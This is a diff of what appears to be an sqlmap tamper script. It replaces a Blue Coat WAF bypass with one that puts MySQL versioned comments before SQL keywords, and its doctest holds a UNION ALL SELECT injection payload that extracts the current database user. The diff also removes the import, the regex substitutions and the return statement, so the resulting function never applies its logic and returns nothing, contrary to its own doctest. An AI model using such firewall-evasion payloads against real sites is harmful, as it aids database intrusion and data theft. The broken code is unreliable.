@@ -18,7 +18,8 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 
 """
-import re
+
+
 keywords = """
 
 ABSOLUTE
@@ -1655,35 +1656,34 @@ MID
 
 """
 
+
+IGNORE_SPACE_AFFECTED_KEYWORDS = ("CAST", "COUNT", "EXTRACT", "GROUP_CONCAT", "MAX", "MID", "MIN", "SESSION_USER", "SUBSTR", "SUBSTRING", "SUM", "SYSTEM_USER", "TRIM")
+
 def tamper(payload, **kwargs):
     """
-    Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE
+    Adds (MySQL) versioned comment before each keyword
 
     Requirement:
-        * Blue Coat SGOS with WAF activated as documented in
-        https://kb.bluecoat.com/index?page=content&id=FAQ2147
+        * MySQL < 5.1
 
     Tested against:
-        * MySQL 5.1, SGOS
+        * MySQL 4.0.18, 5.0.22
 
     Notes:
-        * Useful to bypass Blue Coat's recommended WAF rule configuration
+        * Useful to bypass several web application firewalls when the
+          back-end database management system is MySQL
+        * Used during the ModSecurity SQL injection challenge,
+          http://modsecurity.org/demo/challenge.html
 
-    >>> tamper('SELECT id FROM users WHERE id = 1')
-    'SELECT%09id FROM%09users WHERE%09id LIKE 1'
+    >>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
+    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
     """
+
     def process(match):
         word = match.group('word')
-        if word.upper() in keywords:
-            return match.group().replace(word, "%s%%09" % word)
+        if word.upper() in keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
+            return match.group().replace(word, "/*!0%s" % word)
         else:
             return match.group()
 
     retVal = payload
-
-    if payload:
-        retVal = re.sub(r"\b(?P<word>[A-Z_]+)(?=[^\w(]|\Z)", process, retVal)
-        retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
-        retVal = retVal.replace("%09 ", "%09")
-
-    return retVal
